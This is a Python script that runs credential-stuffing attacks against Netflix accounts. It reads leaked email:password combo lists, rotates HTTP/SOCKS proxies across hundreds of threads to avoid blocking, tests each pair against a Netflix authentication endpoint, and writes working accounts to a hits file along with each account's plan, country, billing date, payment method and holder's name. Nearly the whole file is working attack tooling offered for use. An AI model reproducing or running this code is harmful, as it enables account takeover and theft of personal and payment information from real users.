from Design import *
import requests,threading,os,string,random








class Settings:
    def __init__(self) -> object:
        self.Req = requests.session()
        self.uuid = uuid()
        self.Lock = threading.Lock()

        self.ComboEntry = -1

        self.PRINT = False

        self.Attempts = 0
        self.BadInfo = 0
        self.Expaired = 0
        self.Done = 0
        self.Blocked =0 
        self.Retry = 0
         

        self.Combo =  LoadFile("Combo","combo.txt")
        self.proxies = LoadFile("Proxies","proxies.txt")
    


class THRIDING():
    def __init__(self, fuc):
        self.TARGET = fuc
        self.threads_list = []

    def Generate_threads(self, Attack):
        for i in range(Attack):
            threads = threading.Thread(target=self.TARGET)
            threads.setDaemon(True)
            self.threads_list.append(threads)
        return self.threads_list

    def started(self):
        for threads_Attack in self.threads_list:
            threads_Attack.start()

    def joined(self):
        for thread_join in self.threads_list:
            thread_join.join()
   




class BRUTE_FORCE:
    def __init__(self):
        self.setting = Settings()
        self.REQ = requests.Session()
        

        Print(False,False,"?",Design.red,f" 1-> Proxy - 2-> WithOutProxy  - (Skip -> Proxy) : ",False); 
        try : 
            self.askProxy = int(input()) 
        except:
            self.askProxy = 1
        if self.askProxy == 1:
            Print(False,False,"?",Design.red,f" 1-> http/s - 2-> socks4 - 3-> socks5 - (Skip -> https) : ",False); 
            try : 
                self.ask = int(input()) 
            except:
                self.ask = 1
        

        self.data = {}
    

    def flwssn(self) -> requests.Response : self.REQ.get("https://www.netflix.com/au/login",headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko","Pragma":"no-cache","Accept":"*/*"},timeout=5).cookies["flwssn"]
    def Getinfo(self) -> requests.Response : self.REQ.get("https://www.netflix.com/YourAccount",headers={"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","Accept-Encoding":"gzip, deflate, br","Accept-Language":"en-US,en;q=0.9","Connection":"keep-alive","Host":"www.netflix.com","Referer":"https://www.netflix.com/browse","Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"same-origin","Sec-Fetch-User":"?1","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"},cookies={"flwssn":self.flwssn()},timeout=5).text
    def save_goodinfo(self,text) -> string:return open(f"Hits.txt","a").write(text)
    def save_Expaired(self,username,password) -> string:return open(f"Expaired Accounts.txt","a").write(f"{username}:{password}\n")


    def Brute_Force(self,combo):
        try:
            proxies = random.choice(self.setting.proxies)
            if self.ask == 1:
                erp = {"http": f"{proxies}", "https": f"{proxies}"}
            elif self.ask == 2:
                erp = {"http":"socks4://"f"{proxies}", "https":"socks4://"f"{proxies}"}
            elif self.ask == 3:
                erp = {"http": "socks5://"f"{proxies}", "https":"socks5://"f"{proxies}"}
            username,password = combo.split(":")
        except:
            pass
        if self.askProxy == 1:
            self.Request_login(username,password,combo,erp)
        else:
            self.Request_login(username,password,combo,None)
        
    def remove_user(self,combo):
        if combo not in self.setting.Combo:
            return 
        self.setting.Combo.remove(combo)
        if len(self.setting.Combo) == 0:
            print("\n".join(self.self.setting.Combo), file=open(dir_path + "/combo.txt", "w"))


            
        



    def Request_login(self,username,password,combo,proxies):

        self.data['email'] = username
        self.data['password'] = password
        self.data['setCookies'] = True
        try:
            Response = self.REQ.post("https://cast-uiboot.prod.http1.netflix.com/account/auth",headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Referer":"https://www.netflix.com/Login"},data=self.data,timeout=6,proxies=proxies)
    
            if "NetflixId\":null,\"user\":{\"" in Response.text or "Incorrect email address or password" in Response.text or "Missing password" in Response.text or "NEVER_MEMBER" in Response.text:
                self.setting.BadInfo +=1
                self.setting.Attempts +=1
                self.remove_user(combo)
            elif "FORMER_MEMBER" in Response.text:
                self.setting.Expaired +=1
                self.setting.Attempts +=1
                self.remove_user(combo)
                self.save_Expaired(username,password)
            elif "CURRENT_MEMBER" in Response.text:
                info = self.Getinfo()
                plan = info.text.split('data-uia="plan-label"><b>')[1].split('</b>')[0]
                country = info.text.split('","currentCountry":"')[1].split('"')[0]
                expire = info.text.split('data-uia="nextBillingDate-item">')[1].split('<')[0]
                payment = info.text.split('"paymentMethod":{"fieldType":"String","value":"')[1].split('"')[0]
                name = info.text.split('"firstName":"')[1].split('"')[0]
                self.setting.Done +=1
                self.setting.Attempts +=1
                self.remove_user(combo)
                self.save_goodinfo(f"{username}:{password}:{plan}:{country}:{expire}:{payment}:{name}\n")
            elif "BLOCKED" in Response.text:
                self.setting.Blocked +=1
            
        except:
            self.setting.ComboEntry -=1
            self.setting.Retry +=1


    def main(self):
         while True:
        
            try:
                self.setting.ComboEntry +=1
                combo = self.setting.Combo[self.setting.ComboEntry]        
            except:
                self.setting.ComboEntry =-1
            self.Brute_Force(combo)
    def printer(self):
        while True:
            Design.clearConsle()
            print(Design.reda,Design.Banner,Design.WHITE)
            print(f"""

    {Design.YELLOW}Checking  [{self.setting.Attempts}/{len(self.setting.Combo)}]{Design.WHITE}   
    {Design.GREEN}Good Acc [{self.setting.Done}]{Design.WHITE}
    {Design.blueq}Expired Acc  [{self.setting.Expaired}]{Design.WHITE} 
    {Design.reda}Bad Info  [{self.setting.BadInfo}]{Design.WHITE}
    {Design.reda}Bloked  [{self.setting.Blocked}]{Design.WHITE} 
    {Design.reda}Retry  [{self.setting.Retry}]{Design.WHITE} 


    
    
             """,end='\r')
            time.sleep(0.6)
            if len(self.setting.Combo) == 0:
                MsgBox("Finsh","Sucess Checked All Combo")
                os._exit(0)
            
            
            



if __name__ == '__main__':
   
    
    
    Design.clearConsle()
    print(Design.reda,Design.Banner,Design.WHITE)
    b = BRUTE_FORCE()
    Print(False,False,"?",Design.red,f"Threads  {Design.reda}(Max = 1000 - Skip = 500): ",False)
    try:
        th = int(input())
    except:
        th = 500
    threading.Thread(target=b.printer).start()
    t = THRIDING(b.main)
    t.Generate_threads(th)
    t.started()
    t.joined()




